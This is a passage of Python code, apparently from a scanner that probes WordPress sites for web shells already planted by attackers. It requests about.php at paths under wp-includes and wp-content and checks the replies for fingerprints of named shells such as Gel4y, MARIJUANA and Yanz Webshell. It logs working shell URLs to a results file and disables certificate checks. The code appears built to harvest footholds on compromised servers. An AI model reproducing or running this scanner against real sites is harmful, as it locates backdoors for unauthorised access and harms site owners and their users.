def checkabout(url):
    try:
        url_http = 'http://' + code_shell.url_domain(url)

        check = requests.get(url_http + '/wp-includes/Requests/about.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Uname:' in check.text or '<title>Gel4y' in check.text or '<!--%PDF-yt-->' in check.text or '//0x5a455553.github.io/MARIJUANA/icon.png' in check.text or '<b>Yanz Webshell!</b>' in check.text:
            print(' -| {:<50} --> {}[Succesfully] [About]'.format(url, fg))
            open('results/about.txt', 'a').write(url_http + '/wp-includes/Requests/about.php\n')

        check = requests.get(url_http + '/wp-content/blogs.dir/about.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Uname:' in check.text:
            print(' -| {:<50} --> {}[Succesfully] [About]'.format(url, fg))
